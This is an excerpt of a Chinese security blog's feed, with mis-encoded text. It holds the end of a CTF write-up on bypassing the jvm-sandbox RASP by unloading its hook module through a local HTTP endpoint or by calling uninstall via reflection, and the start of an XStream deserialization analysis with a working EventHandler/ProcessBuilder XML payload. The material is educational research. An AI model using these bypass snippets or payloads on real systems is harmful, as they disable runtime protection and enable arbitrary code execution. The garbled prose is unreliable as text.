String&gt; featureMap)</span> &#123;  <br>        <span class="hljs-keyword">return</span> getDefault(featureMap, <span class="hljs-string">&quot;namespace&quot;</span>, <span class="hljs-string">&quot;default&quot;</span>);  <br>    &#125;  <br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getToken</span><span class="hljs-params">(Map&lt;String, String&gt; featureMap)</span> &#123;  <br>        <span class="hljs-keyword">return</span> getDefault(featureMap, <span class="hljs-string">&quot;token&quot;</span>, <span class="hljs-string">&quot;&quot;</span>);  <br>    &#125;  <br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getPropertiesFilePath</span><span class="hljs-params">(Map&lt;String, String&gt; featureMap)</span> &#123;  <br>        <span class="hljs-keyword">return</span> getDefault(featureMap, <span class="hljs-string">&quot;prop&quot;</span>, getSandboxPropertiesPath(getSandboxHome(featureMap)));  <br>    &#125;  <br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">appendFromFeatureMap</span><span class="hljs-params">(StringBuilder featureSB, Map&lt;String, String&gt; featureMap, String key, String defaultValue)</span> &#123;  <br>        <span class="hljs-keyword">if</span> (featureMap.containsKey(key)) &#123;  <br>            featureSB.append(String.format(<span class="hljs-string">&quot;%s=%s;&quot;</span>, key, getDefault(featureMap, key, defaultValue)));  <br>        &#125;  <br><br>    &#125;  <br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">toFeatureString</span><span class="hljs-params">(Map&lt;String, String&gt; featureMap)</span> &#123;  <br>        <span class="hljs-type">String</span> <span class="hljs-variable">sandboxHome</span> <span class="hljs-operator">=</span> getSandboxHome(featureMap);  <br>        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">featureSB</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(String.format(<span class="hljs-string">&quot;;cfg=%s;system_module=%s;mode=%s;sandbox_home=%s;user_module=%s;provider=%s;namespace=%s;&quot;</span>, getSandboxCfgPath(sandboxHome), getSandboxModulePath(sandboxHome), LAUNCH_MODE, sandboxHome, SANDBOX_USER_MODULE_PATH, getSandboxProviderPath(sandboxHome), getNamespace(featureMap)));  <br>        appendFromFeatureMap(featureSB, featureMap, <span class="hljs-string">&quot;server.ip&quot;</span>, <span class="hljs-string">&quot;0.0.0.0&quot;</span>);  <br>        appendFromFeatureMap(featureSB, featureMap, <span class="hljs-string">&quot;server.port&quot;</span>, <span class="hljs-string">&quot;0&quot;</span>);  <br>        <span class="hljs-keyword">return</span> featureSB.toString();  <br>    &#125;  <br><br>    <span class="hljs-keyword">static</span> &#123;  <br>        SANDBOX_USER_MODULE_PATH = DEFAULT_SANDBOX_HOME + File.separator + <span class="hljs-string">&quot;sandbox-module&quot;</span>;  <br>        <span class="hljs-type">String</span> <span class="hljs-variable">var10000</span> <span class="hljs-operator">=</span> System.getProperties().getProperty(<span class="hljs-string">&quot;user.home&quot;</span>);  <br>        RESULT_FILE_PATH = var10000 + File.separator + <span class="hljs-string">&quot;.sandbox.token&quot;</span>;  <br>        sandboxClassLoaderMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConcurrentHashMap</span>();  <br>        OS = System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>).toLowerCase();  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªæ²™ç®±æ˜¯é˜¿é‡Œäº‘çš„ä¸€ä¸ªsandboxé¡¹ç›®ï¼Œé¡¹ç›®åœ°å€ï¼š<a href="https://github.com/alibaba/jvm-sandbox">https://github.com/alibaba/jvm-sandbox</a></p><p>å…¶ä¸­ä»–æ˜¯æœ‰ä¸€ä¸ªå¸è½½æ²™ç®±çš„æ“ä½œçš„ï¼Œè¿™æ˜¯å®˜æ–¹ç»™å‡ºçš„å¸è½½å‘½ä»¤</p><figure class="highlight sh"><table><tr><td class="code"><pre><code class="hljs sh">./sandbox.sh -p 33342 -S<br>jvm-sandbox[default] shutdown finished.<br></code></pre></td></tr></table></figure><p>è¿™é¢˜çœ‹äº†å„ä¸ªæ–‡ç« ï¼Œä»–ä»¬çš„åšæ³•ä¹Ÿéƒ½æ˜¯ç›´æ¥å¸è½½raspæ²™ç®±æ¥å®ç°ç»•è¿‡ï¼Œæœ‰æ®µæ›´è¯¦ç»†çš„å¸è½½æ“ä½œåœ¨ä»–çš„.shè„šæœ¬æ–‡ä»¶é‡Œé¢ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥å°†ä»–çš„è„šæœ¬ç²˜è´´è¿‡å»é—®ä¸€ä¸‹gptå®ƒæ˜¯å¦‚ä½•å¸è½½çš„</p><p><img src="https://cdn.clown2024.cn/image-20241111220208835.png" alt="image-20241111220208835"></p><p>è¿™é‡Œæœ‰ä¸ª-uå¯ä»¥å¸è½½æŒ‡å®šæ¨¡å—</p><p>å®ƒé‡Œé¢çš„å…·ä½“æ“ä½œæ˜¯è°ƒç”¨ä¸€ä¸ª<code>sandbox_curl_with_exit</code>å‡½æ•°å‘èµ·è¯·æ±‚åˆ°æ²™ç®±æœåŠ¡å™¨æ¥æ‰§è¡Œå¸è½½æ¨¡å—çš„æ“ä½œï¼Œå®˜æ–¹è„šæœ¬ç¤ºä¾‹å¦‚ä¸‹</p><p><img src="https://cdn.clown2024.cn/image-20241111222729536.png" alt="image-20241111222729536"></p><p>é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡ç›´æ¥è¯·æ±‚å¯¹åº”çš„urlæ¥è¿›è¡Œæ¨¡å—çš„å¸è½½ï¼Œé‚£ä¹ˆraspç›‘å¬çš„æ˜¯å“ªä¸ªç«¯å£å‘¢ï¼Œè¿™ä¸ªæˆ‘ä»¬å»çœ‹raspçš„logå°±èƒ½çŸ¥é“äº†</p><p>æŸ¥çœ‹æ—¥å¿—</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">try</span> &#123;<br>            java.net.<span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.net.URL(<span class="hljs-string">&quot;file:///home/ctf/logs/sandbox/sandbox.log&quot;</span>);<br>            java.io.<span class="hljs-type">InputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> url.openStream();<br>            <span class="hljs-type">byte</span>[] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">0</span>];<br>            bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[inputStream.available()];<br>            inputStream.read(bytes);<br>            System.out.println(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(bytes));<br>            System.out.println(java.util.Base64.getEncoder().encodeToString(bytes));<br>        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            System.out.println(<span class="hljs-string">&quot;error&quot;</span>);<br>        &#125;<br></code></pre></td></tr></table></figure><p>é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å†™ä¸€ä¸ªè¯·æ±‚ä»£ç å»è¯·æ±‚æœ¬åœ°çš„raspæ¥å£ç„¶åå¸è½½æ¨¡å—ï¼š<a href="http://127.0.0.1:port/sandbox/default/module/http/sandbox-module-mgr/unload?action=unload&ids=rasp-rce-native-hook">http://127.0.0.1:port/sandbox/default/module/http/sandbox-module-mgr/unload?action=unload&amp;ids=rasp-rce-native-hook</a></p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">java.net.<span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            url = <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.net.URL(<span class="hljs-string">&quot;http://127.0.0.1:&lt;port&gt;/sandbox/default/module/http/sandbox-module-mgr/unload?action=unload&amp;ids=rasp-rce-native-hook&quot;</span>);<br>            java.net.<span class="hljs-type">HttpURLConnection</span> <span class="hljs-variable">connection</span> <span class="hljs-operator">=</span> (java.net.HttpURLConnection) url.openConnection();<br>            connection.setRequestMethod(<span class="hljs-string">&quot;GET&quot;</span>);<br>            connection.setUseCaches(<span class="hljs-literal">false</span>);<br>            connection.setConnectTimeout(<span class="hljs-number">5000</span>); <span class="hljs-comment">// 5 seconds</span><br>            <span class="hljs-type">int</span> <span class="hljs-variable">responseCode</span> <span class="hljs-operator">=</span> connection.getResponseCode();<br>            java.lang.System.out.println(<span class="hljs-string">&quot;Response Code : &quot;</span> + responseCode);<br>            <span class="hljs-keyword">if</span> (responseCode == java.net.HttpURLConnection.HTTP_OK) &#123;<br>                java.io.<span class="hljs-type">InputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> connection.getInputStream();<br>                java.io.<span class="hljs-type">InputStreamReader</span> <span class="hljs-variable">inputStreamReader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.InputStreamReader(inputStream);<br>                java.io.<span class="hljs-type">BufferedReader</span> <span class="hljs-variable">bufferedReader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.BufferedReader(inputStreamReader);<br><br>                java.lang.String output;<br>                java.lang.<span class="hljs-type">StringBuffer</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.lang.StringBuffer();<br>                <span class="hljs-keyword">while</span> ((output = bufferedReader.readLine()) != <span class="hljs-literal">null</span>) &#123;<br>                    response.append(output);<br>                &#125;<br>                bufferedReader.close();<br>                inputStreamReader.close();<br>                inputStream.close();<br>                connection.disconnect();<br>                java.lang.System.out.println(<span class="hljs-string">&quot;Response Body: &quot;</span> + response.toString());<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                java.lang.System.out.println(<span class="hljs-string">&quot;Request failed!&quot;</span>);<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (java.net.MalformedURLException e) &#123;<br>            e.printStackTrace();<br>        &#125; <span class="hljs-keyword">catch</span> (java.io.IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br></code></pre></td></tr></table></figure><p>ç„¶åå°±å¯ä»¥æ‰§è¡Œä»»æ„ä»£ç äº†ï¼Œè‡³äºæˆ‘ä»¬éœ€è¦å¸è½½çš„æ¨¡å—åç§°åœ¨æ—¥å¿—é‡Œé¢ä¹Ÿæ˜¯èƒ½çœ‹åˆ°çš„ï¼Œæ—¥å¿—çš„è·¯å¾„ä¹Ÿå¯ä»¥åœ¨é¡¹ç›®çš„logback.xmlä¸­çœ‹åˆ°</p><p><img src="https://cdn.clown2024.cn/image-20241111223601498.png" alt="image-20241111223601498"></p><p>å¸è½½å®Œä¹‹åå°±èƒ½æ‰§è¡Œä»»æ„ä»£ç äº†</p><p><strong>ç›´æ¥è°ƒç”¨uninstallæ¥å¸è½½æ¨¡å—</strong></p><p>è¿˜å¯ä»¥ç›´æ¥æ ¹æ®å‰é¢çš„æºç çŸ¥é“ä»–åˆuninstallæ–¹æ³•å¯ä»¥ç”¨æ¥å¸è½½æ¨¡å—ï¼Œå°±å¯ä»¥ç›´æ¥å†™æ¶æ„ä»£ç æ¥å¸è½½æ¨¡å—</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">try</span> &#123;<br><span class="hljs-comment">// ä½¿ç”¨ç±»åŠ è½½å™¨åŠ¨æ€åŠ è½½ AgentLauncher ç±»</span><br>            Class&lt;?&gt; agentLauncherClass = Class.forName(<span class="hljs-string">&quot;com.alibaba.jvm.sandbox.agent.AgentLauncher&quot;</span>);<br><br>            <span class="hljs-comment">// è·å– uninstall æ–¹æ³•</span><br>System.out.println(agentLauncherClass);<br><span class="hljs-type">String</span> <span class="hljs-variable">className</span> <span class="hljs-operator">=</span>Thread.currentThread().getStackTrace()[<span class="hljs-number">1</span>].getClassName();<br>System.out.println(<span class="hljs-string">&quot;å½“å‰ç±»å: &quot;</span> + className);<br>                java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">uninstallMethod</span> <span class="hljs-operator">=</span> agentLauncherClass.getDeclaredMethod(<span class="hljs-string">&quot;uninstall&quot;</span>, String.class);<br><br>uninstallMethod.invoke(<span class="hljs-literal">null</span>, <span class="hljs-string">&quot;default&quot;</span>);<br><br>            System.out.println(<span class="hljs-string">&quot;Sandbox å¸è½½æˆåŠŸï¼&quot;</span>);<br><br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            System.err.println(<span class="hljs-string">&quot;è°ƒç”¨å¸è½½æ–¹æ³•æ—¶å‡ºé”™: &quot;</span> + e.getMessage());<br>            e.printStackTrace();<br>        &#125;<br></code></pre></td></tr></table></figure><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="https://aiwin.fun/index.php/archives/4389/">https://aiwin.fun/index.php/archives/4389/</a></p><p><a href="https://www.bookstack.cn/read/anbai-inc-javaweb-sec/javase-CommandExecution-README.md">https://www.bookstack.cn/read/anbai-inc-javaweb-sec/javase-CommandExecution-README.md</a></p><p><a href="https://dummykitty.github.io/java/2023/06/15/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%95%E8%BF%87-RASP.html">https://dummykitty.github.io/java/2023/06/15/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%95%E8%BF%87-RASP.html</a></p><p><strong>å¼ºç½‘æ‹Ÿæ€çš„æ–‡ç« </strong></p><p><a href="https://xz.aliyun.com/t/15907?time__1311=GqjxcD2DuDRDyGDlxGo+CfoY5D=eQh4he+D">https://xz.aliyun.com/t/15907?time__1311=GqjxcD2DuDRDyGDlxGo%2BCfoY5D%3DeQh4he%2BD</a></p><p><a href="https://blog.potatowo.top/2024/10/21/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812024Web-Writeup">https://blog.potatowo.top/2024/10/21/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812024Web-Writeup</a></p><p><a href="https://blog.wm-team.cn/index.php/archives/84">https://blog.wm-team.cn/index.php/archives/84</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;raspä»‹ç»&quot;&gt;&lt;a href=&quot;#RASPä»‹ç»&quot; class=&quot;headerlink&quot; title=&quot;RASPä»‹ç»&quot;&gt;&lt;/a&gt;RASPä»‹ç»&lt;/h1&gt;&lt;p&gt;RASPå…¨ç§°æ˜¯Runtime applicaion self-protectionï¼Œåœ¨2014å¿µæå‡ºçš„ä¸€ç§åº”</summary>
      
    
    
    
    <category term="java" scheme="https://clowsman.github.io/categories/java/"/>
    
    
    <category term="java" scheme="https://clowsman.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>XStreamååºåˆ—åŒ–</title>
    <link href="https://clowsman.github.io/2024/11/04/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>https://clowsman.github.io/2024/11/04/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2024-11-03T16:13:50.000Z</published>
    <updated>2024-11-06T07:41:39.449Z</updated>
    
    <content type="html"><![CDATA[<h1 id="xstreamä»‹ç»"><a href="#XStreamä»‹ç»" class="headerlink" title="XStreamä»‹ç»"></a>XStreamä»‹ç»</h1><p>XStreamæ˜¯ä¸€ä¸ªç®€å•çš„åŸºäºJavaåº“ï¼Œèƒ½å¤Ÿå°†Javaå¯¹è±¡å’Œxmlæ–‡æ¡£ä¹‹é—´è¿›è¡Œç›¸äº’è½¬æ¢</p><h1 id="ååºåˆ—åŒ–åŸå› "><a href="#ååºåˆ—åŒ–åŸå› " class="headerlink" title="ååºåˆ—åŒ–åŸå› "></a>ååºåˆ—åŒ–åŸå› </h1><p>XStreamå®ç°äº†ä¸€å¥—åºåˆ—åŒ–å’Œååºåˆ—åŒ–æœºåˆ¶ï¼Œæ ¸å¿ƒæ˜¯é€šè¿‡Converterè½¬æ¢å™¨æ¥å°†XMLå’Œå¯¹è±¡ä¹‹é—´è¿›è¡Œç›¸äº’çš„è½¬æ¢ã€‚</p><p>XStreamååºåˆ—åŒ–æ¼æ´çš„å­˜åœ¨æ˜¯å› ä¸ºXStreamæ”¯æŒä¸€ä¸ªåä¸ºDynamicProxyConverterçš„è½¬æ¢å™¨ï¼Œè¯¥è½¬æ¢å™¨å¯ä»¥å°†XMLä¸­dynamic-proxyæ ‡ç­¾å†…å®¹è½¬æ¢æˆåŠ¨æ€ä»£ç†ç±»å¯¹è±¡ï¼Œè€Œå½“ç¨‹åºè°ƒç”¨äº†dynamic-proxyæ ‡ç­¾å†…çš„interfaceæ ‡ç­¾æŒ‡å‘çš„æ¥å£ç±»å£°æ˜çš„æ–¹æ³•æ—¶ï¼Œå°±ä¼šé€šè¿‡åŠ¨æ€ä»£ç†æœºåˆ¶ä»£ç†è®¿é—®dynamic-proxyæ ‡ç­¾å†…handleræ ‡ç­¾æŒ‡å®šçš„ç±»æ–¹æ³•ï¼›</p><p>åˆ©ç”¨è¿™ä¸ªæœºåˆ¶ï¼Œæ”»å‡»è€…å¯ä»¥æ„é€ æ¶æ„çš„XMLå†…å®¹ï¼Œå³dynamic-proxyæ ‡ç­¾å†…çš„handleræ ‡ç­¾æŒ‡å‘å¦‚EventHandlerç±»è¿™ç§å¯å®ç°ä»»æ„å‡½æ•°åå°„è°ƒç”¨çš„æ¶æ„ç±»ã€interfaceæ ‡ç­¾æŒ‡å‘ç›®æ ‡ç¨‹åºå¿…ç„¶ä¼šè°ƒç”¨çš„æ¥å£ç±»æ–¹æ³•ï¼›æœ€åå½“æ”»å‡»è€…ä»å¤–éƒ¨è¾“å…¥è¯¥æ¶æ„XMLå†…å®¹åå³å¯è§¦å‘ååºåˆ—åŒ–æ¼æ´ã€è¾¾åˆ°ä»»æ„ä»£ç æ‰§è¡Œçš„ç›®çš„ã€‚</p><h1 id="ç›¸å…³ç±»ä»‹ç»"><a href="#ç›¸å…³ç±»ä»‹ç»" class="headerlink" title="ç›¸å…³ç±»ä»‹ç»"></a>ç›¸å…³ç±»ä»‹ç»</h1><h2 id="eventhandlerç±»"><a href="#EventHandlerç±»" class="headerlink" title="EventHandlerç±»"></a>EventHandlerç±»</h2><p>EventHandleræ˜¯ä¸€ä¸ªå®ç°äº†InvocationHandleræ¥å£çš„ç±»ï¼Œè®¾è®¡æœ¬æ„æ˜¯ä¸ºäº¤äº’å·¥å…·æä¾›beansï¼Œå»ºç«‹ä»ç”¨æˆ·ç•Œé¢åˆ°åº”ç”¨ç¨‹åºé€»è¾‘çš„è¿æ¥</p><p><img src="https://cdn.clown2024.cn/image-20241104142648830.png" alt="image-20241104142648830"></p><p>EventHandlerçš„ç±»ä¸­æœ‰targetå’Œactionå±æ€§ï¼Œåœ¨EventHandler.invoke()-&gt;EventHandler.invokeInternal()-&gt;MethodUtil.invoke()çš„å‡½æ•°è°ƒç”¨é“¾ä¸­ï¼Œä¼šå°†è¿™ä¸¤ä¸ªå±æ€§ä½œä¸ºç±»æ–¹æ³•å’Œå‚æ•°ç»§ç»­åå°„è°ƒç”¨</p><p><img src="https://cdn.clown2024.cn/image-20241104143224758.png" alt="image-20241104143224758"></p><p><img src="https://cdn.clown2024.cn/image-20241104143340622.png" alt="image-20241104143340622"></p><h2 id="converterè½¬æ¢å™¨"><a href="#Converterè½¬æ¢å™¨" class="headerlink" title="Converterè½¬æ¢å™¨"></a>Converterè½¬æ¢å™¨</h2><p>XStreamä¸ºJavaå¸¸è§çš„ç±»å‹æä¾›äº†Converterè½¬æ¢å™¨ã€‚è½¬æ¢å™¨æ³¨å†Œä¸­å¿ƒæ˜¯XStreamç»„æˆçš„æ ¸å¿ƒéƒ¨åˆ†ã€‚</p><p><img src="https://cdn.clown2024.cn/image-20241104143603604.png" alt="image-20241104143603604"></p><p>æˆ‘çœ‹y4å¸ˆå‚…çš„æ–‡ç« ä¸­è¯´è½¬æ¢å™¨éœ€è¦å®ç°ä¸‰ä¸ªæ–¹æ³•ï¼š</p><ul><li>canConvertæ–¹æ³•ï¼šå‘Šè¯‰XStreamå¯¹è±¡ï¼Œå®ƒèƒ½å¤Ÿè½¬æ¢çš„å¯¹è±¡ï¼›</li><li>marshalæ–¹æ³•ï¼šèƒ½å¤Ÿå°†å¯¹è±¡è½¬æ¢ä¸ºXMLæ—¶å€™çš„å…·ä½“æ“ä½œï¼›</li><li>unmarshalæ–¹æ³•ï¼šèƒ½å¤Ÿå°†XMLè½¬æ¢ä¸ºå¯¹è±¡æ—¶çš„å…·ä½“æ“ä½œï¼›</li></ul><p>ä½†æˆ‘åœ¨1.4.10ç‰ˆæœ¬ä¸­åªéœ€è¦å®ç°ä¸¤ç§æ–¹æ³•å³å¯</p><p>XStreamçš„apiæ–‡æ¡£ï¼š<a href="http://x-stream.github.io/converters.html">http://x-stream.github.io/converters.html</a></p><h2 id="åŸºæœ¬ä½¿ç”¨"><a href="#åŸºæœ¬ä½¿ç”¨" class="headerlink" title="åŸºæœ¬ä½¿ç”¨"></a>åŸºæœ¬ä½¿ç”¨</h2><p>ä½¿ç”¨ä¸€ä¸‹çœ‹çœ‹è½¬æ¢å‡ºæ¥çš„xmlé•¿ä»€ä¹ˆæ ·</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.Attack;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br>    <span class="hljs-keyword">private</span> String name;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Student</span><span class="hljs-params">()</span>&#123;&#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Student</span><span class="hljs-params">(<span class="hljs-type">int</span> age, String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.age = age;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Student&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;age=&quot;</span> + age +<br>                <span class="hljs-string">&quot;, name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.Attack;<br><br><span class="hljs-keyword">import</span> com.thoughtworks.xstream.XStream;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">XStream</span> <span class="hljs-variable">xStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">XStream</span>();<br>        <span class="hljs-type">Student</span> <span class="hljs-variable">clown</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>(<span class="hljs-number">150</span>, <span class="hljs-string">&quot;clown&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">xml</span> <span class="hljs-operator">=</span> xStream.toXML(clown);<br>        System.out.println(xml);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç»“æœ</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">org.example.Attack.Student</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">age</span>&gt;</span>150<span class="hljs-tag">&lt;/<span class="hljs-name">age</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>clown<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">org.example.Attack.Student</span>&gt;</span><br></code></pre></td></tr></table></figure><h1 id="åˆ©ç”¨é“¾åˆ†æ"><a href="#åˆ©ç”¨é“¾åˆ†æ" class="headerlink" title="åˆ©ç”¨é“¾åˆ†æ"></a>åˆ©ç”¨é“¾åˆ†æ</h1><p>è¿™é‡Œå°±åˆ†æå‡ ä¸ªåˆ©ç”¨é“¾ï¼Œå› ä¸ºXStreamçš„cveæ¯”è¾ƒå¤šï¼Œè€Œä¸”é€‚ç”¨çš„ç‰ˆæœ¬ä¹Ÿä¸ä¸€æ ·ï¼Œå°±è·Ÿç€y4å¸ˆå‚…åˆ†æå…¶æ–‡ç« ä¸­çš„ä¸¤ä¸ªåˆ©ç”¨é“¾</p><p>è½¬åŒ–xmlçš„demo</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fileInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;payload.txt&quot;</span>);<br>        <span class="hljs-type">XStream</span> <span class="hljs-variable">xStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">XStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">DomDriver</span>());<br>        xStream.fromXML(fileInputStream);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="sorted-set"><a href="#sorted-set" class="headerlink" title="sorted-set"></a>sorted-set</h2><p>è¿™æ˜¯ä¸€ä¸ªCVE-2013-7258è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´</p><h3 id="å½±å“ç‰ˆæœ¬"><a href="#å½±å“ç‰ˆæœ¬" class="headerlink" title="å½±å“ç‰ˆæœ¬"></a>å½±å“ç‰ˆæœ¬</h3><p>1.4.5ï¼Œ1.4.6æˆ–1.4.10ï¼Œæˆ‘è¿™é‡Œç”¨1.4.10ç‰ˆæœ¬æ¥å®éªŒ</p><p>payload</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">sorted-set</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dynamic-proxy</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">interface</span>&gt;</span>java.lang.Comparable<span class="hljs-tag">&lt;/<span class="hljs-name">interface</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">handler</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.beans.EventHandler&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">target</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">command</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>calc<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">command</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">target</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">action</span>&gt;</span>start<span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">handler</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dynamic-proxy</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">sorted-set</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241104145857536.png" alt="image-20241104145857536"></p><h3 id="æµç¨‹åˆ†æ"><a href="#æµç¨‹åˆ†æ" class="headerlink" title="æµç¨‹åˆ†æ"></a>æµç¨‹åˆ†æ</h3><p>æˆ‘ä»¬å¯ä»¥ä»æŠ¥é”™çš„è°ƒç”¨æ 